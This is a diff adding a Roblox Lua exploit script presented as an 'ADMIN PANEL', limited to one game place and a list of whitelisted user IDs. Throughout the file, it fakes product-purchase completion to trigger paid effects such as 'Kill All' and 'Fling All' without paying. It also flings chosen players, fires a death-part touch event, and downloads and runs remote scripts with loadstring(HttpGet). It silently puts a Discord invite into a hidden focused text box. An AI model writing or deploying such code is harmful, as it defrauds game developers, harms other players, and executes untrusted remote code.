@@ -1,0 +1,305 @@
+--==================================================
+-- SILENT EXPERIENCE LOCK
+--==================================================
+if game.PlaceId ~= 78458398895753 then
+	return
+end
+
+--==================================================
+-- SERVICES
+--==================================================
+local Players = game:GetService("Players")
+local MarketplaceService = game:GetService("MarketplaceService")
+local UserInputService = game:GetService("UserInputService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+local LocalPlayer = Players.LocalPlayer
+local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
+
+--==================================================
+-- ACCESS IDS
+--==================================================
+local allowedIds = {
+	[1247981068]=true,[4971827646]=true,[1366799706]=true,[8875263792]=true,
+	[2657344311]=true,[530701231]=true,[1119400070]=true,[10284358952]=true,
+	[10305665790]=true,[3749287431]=true,[8384197121]=true,[4187988480]=true,
+	[4530125920]=true,[4946984979]=true
+}
+
+if not allowedIds[LocalPlayer.UserId] then
+	return
+end
+
+--==================================================
+-- DISCORD AUTOCOPY
+--==================================================
+local copyBox = Instance.new("TextBox", PlayerGui)
+copyBox.Size = UDim2.new(0,1,0,1)
+copyBox.TextTransparency = 1
+copyBox.BackgroundTransparency = 1
+copyBox.TextEditable = false
+copyBox.ClearTextOnFocus = false
+copyBox.Text = "https://discord.gg/Jk7rahYzmQ"
+copyBox:CaptureFocus()
+copyBox.SelectionStart = 1
+copyBox.CursorPosition = #copyBox.Text + 1
+
+--==================================================
+-- MAIN GUI
+--==================================================
+local gui = Instance.new("ScreenGui", PlayerGui)
+gui.ResetOnSpawn = false
+
+local frame = Instance.new("Frame", gui)
+frame.Size = UDim2.new(0,260,0,460)
+frame.Position = UDim2.new(1,-270,0.5,-315)
+frame.BackgroundColor3 = Color3.fromRGB(0,0,0)
+frame.Visible = false
+Instance.new("UICorner", frame).CornerRadius = UDim.new(0,12)
+
+--==================================================
+-- GOLD STROKE UTIL
+--==================================================
+local GOLD = Color3.fromRGB(212,175,55)
+local function addGoldStroke(ui)
+	local s = Instance.new("UIStroke")
+	s.Color = GOLD
+	s.Thickness = 2
+	s.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+	s.Parent = ui
+end
+addGoldStroke(frame)
+
+--==================================================
+-- AP BUTTON (FIXED)
+--==================================================
+local apGui = Instance.new("ScreenGui", PlayerGui)
+apGui.ResetOnSpawn = false
+
+local apButton = Instance.new("TextButton", apGui)
+apButton.Size = UDim2.new(0,60,0,60)
+apButton.AnchorPoint = Vector2.new(1,1)
+apButton.Position = UDim2.new(1,-20,0.5,-156)
+apButton.Text = "AP"
+apButton.TextScaled = true
+apButton.Font = Enum.Font.GothamBlack
+apButton.BackgroundColor3 = Color3.fromRGB(50,50,50)
+apButton.TextColor3 = Color3.new(1,1,1)
+Instance.new("UICorner", apButton).CornerRadius = UDim.new(0,12)
+addGoldStroke(apButton)
+
+apButton.MouseButton1Click:Connect(function()
+	frame.Visible = not frame.Visible
+end)
+
+--==================================================
+-- DRAGGABLE PANEL
+--==================================================
+local dragging, dragStart, startPos
+frame.InputBegan:Connect(function(i)
+	if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
+		dragging = true
+		dragStart = i.Position
+		startPos = frame.Position
+	end
+end)
+UserInputService.InputEnded:Connect(function(i)
+	if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
+		dragging = false
+	end
+end)
+UserInputService.InputChanged:Connect(function(i)
+	if dragging and (i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch) then
+		local delta = i.Position - dragStart
+		frame.Position = UDim2.new(
+			startPos.X.Scale, startPos.X.Offset + delta.X,
+			startPos.Y.Scale, startPos.Y.Offset + delta.Y
+		)
+	end
+end)
+
+--==================================================
+-- TITLE
+--==================================================
+local title = Instance.new("TextLabel", frame)
+title.Size = UDim2.new(1,0,0,30)
+title.Position = UDim2.new(0,0,0,0)
+title.BackgroundTransparency = 1
+title.Text = "ADMIN PANEL"
+title.TextScaled = true
+title.Font = Enum.Font.GothamBold
+title.TextColor3 = Color3.new(1,1,1)
+title.TextStrokeTransparency = 0
+title.TextStrokeColor3 = Color3.new(0,0,0)
+
+--==================================================
+-- UTIL
+--==================================================
+local function purchase(id)
+	MarketplaceService:SignalPromptProductPurchaseFinished(LocalPlayer.UserId,id,true)
+end
+
+local function resolvePlayerName(partial)
+	partial = partial:lower()
+	for _,plr in pairs(Players:GetPlayers()) do
+		if plr.Name:lower():sub(1,#partial) == partial then
+			return plr.Name
+		end
+	end
+end
+
+local function makeButton(text,y,callback)
+	local b = Instance.new("TextButton", frame)
+	b.Size = UDim2.new(0.9,0,0,35)
+	b.Position = UDim2.new(0.05,0,0,y)
+	b.Text = text
+	b.TextScaled = true
+	b.Font = Enum.Font.GothamBold
+	b.TextColor3 = Color3.new(1,1,1)
+	b.TextStrokeTransparency = 0
+	b.TextStrokeColor3 = Color3.new(0,0,0)
+	b.BackgroundColor3 = Color3.fromRGB(70,70,70)
+	Instance.new("UICorner", b).CornerRadius = UDim.new(0,8)
+	addGoldStroke(b)
+	b.MouseButton1Click:Connect(callback)
+end
+
+--==================================================
+-- MAIN BUTTONS
+--==================================================
+makeButton("Skip Level",40,function() purchase(2667066831) end)
+makeButton("Kill All",80,function() purchase(3336458992) end)
+makeButton("Fling All",120,function() purchase(3378303882) end)
+makeButton("Infinite Yield",160,function()
+	loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Infinite-yield-reborn-83505"))()
+end)
+makeButton("VFly",200,function()
+	loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-VFly-English-22651"))()
+end)
+
+--==================================================
+-- FLING SPECIFIC PLAYER PANEL
+--==================================================
+local toggle = Instance.new("TextButton", frame)
+toggle.Size = UDim2.new(0.9,0,0,30)
+toggle.Position = UDim2.new(0.05,0,0,245)
+toggle.Text = "Fling Specific Player"
+toggle.TextScaled = true
+toggle.Font = Enum.Font.GothamBold
+toggle.TextColor3 = Color3.new(1,1,1)
+toggle.TextStrokeTransparency = 0
+toggle.TextStrokeColor3 = Color3.new(0,0,0)
+toggle.BackgroundColor3 = Color3.fromRGB(70,70,70)
+Instance.new("UICorner", toggle).CornerRadius = UDim.new(0,8)
+addGoldStroke(toggle)
+
+local panel = Instance.new("ScrollingFrame", frame)
+panel.Size = UDim2.new(0.9,0,0,120)
+panel.Position = UDim2.new(0.05,0,0,280)
+panel.CanvasSize = UDim2.new(0,0,0,0)
+panel.ScrollBarThickness = 6
+panel.Visible = false
+panel.BackgroundColor3 = Color3.fromRGB(0,0,0)
+addGoldStroke(panel)
+
+toggle.MouseButton1Click:Connect(function()
+	panel.Visible = not panel.Visible
+end)
+
+local function refreshPlayers()
+	panel:ClearAllChildren()
+	local y = 0
+	for _,plr in pairs(Players:GetPlayers()) do
+		if plr ~= LocalPlayer then
+			local b = Instance.new("TextButton", panel)
+			b.Size = UDim2.new(1,-5,0,28)
+			b.Position = UDim2.new(0,0,0,y)
+			b.Text = plr.Name
+			b.TextScaled = true
+			b.Font = Enum.Font.Gotham
+			b.TextColor3 = Color3.new(1,1,1)
+			b.TextStrokeTransparency = 0
+			b.TextStrokeColor3 = Color3.new(0,0,0)
+			b.BackgroundColor3 = Color3.fromRGB(70,70,70)
+			Instance.new("UICorner", b).CornerRadius = UDim.new(0,6)
+			addGoldStroke(b)
+
+			b.MouseButton1Click:Connect(function()
+				if plr ~= LocalPlayer then
+					ReplicatedStorage:WaitForChild("PurchaseRequested"):FireServer(plr.Name)
+					task.wait(0.1)
+					purchase(2667076892)
+				end
+			end)
+
+			y += 32
+		end
+	end
+	panel.CanvasSize = UDim2.new(0,0,0,y)
+end
+
+refreshPlayers()
+Players.PlayerAdded:Connect(refreshPlayers)
+Players.PlayerRemoving:Connect(refreshPlayers)
+
+--==================================================
+-- INFO TEXT
+--==================================================
+local info = Instance.new("TextLabel", frame)
+info.Size = UDim2.new(1,-10,0,70)
+info.Position = UDim2.new(0,5,1,-80)
+info.BackgroundTransparency = 1
+info.TextWrapped = true
+info.TextYAlignment = Enum.TextYAlignment.Top
+info.TextXAlignment = Enum.TextXAlignment.Left
+info.TextSize = 12
+info.Font = Enum.Font.Gotham
+info.TextColor3 = Color3.new(1,1,1)
+info.TextStrokeTransparency = 0
+info.TextStrokeColor3 = Color3.new(0,0,0)
+info.Text =
+"Use chat commands:\n" ..
+";skip level\n" ..
+";kill all\n" ..
+";fling all\n" ..
+";fling username abbreviated to 3 letters"
+
+--==================================================
+-- CHAT COMMANDS (SAFE Fling)
+--==================================================
+local function flingPlayer(target)
+	if target == LocalPlayer.Name then return end
+	ReplicatedStorage:WaitForChild("PurchaseRequested"):FireServer(target)
+	task.wait(0.1)
+	purchase(2667076892)
+end
+
+LocalPlayer.Chatted:Connect(function(msg)
+	msg = msg:lower()
+	if msg == ";skip level" then
+		purchase(2667066831)
+	elseif msg == ";kill all" then
+		purchase(3336458992)
+	elseif msg == ";fling all" then
+		purchase(3378303882)
+	elseif msg:sub(1,7) == ";fling " then
+		local resolved = resolvePlayerName(msg:sub(8))
+		if resolved then
+			flingPlayer(resolved)
+		end
+	end
+end)
+
+--==================================================
+-- TOUCHINTEREST AUTOMÁTICO 5s
+--==================================================
+task.spawn(function()
+	task.wait(5)
+	local deathParts = workspace:FindFirstChild("DeathParts")
+	if deathParts and #deathParts:GetChildren() >= 3 then
+		local part = deathParts:GetChildren()[3]
+		if part:FindFirstChild("TouchInterest") then
+			part.TouchInterest:Fire()
+		end
+	end
+end)
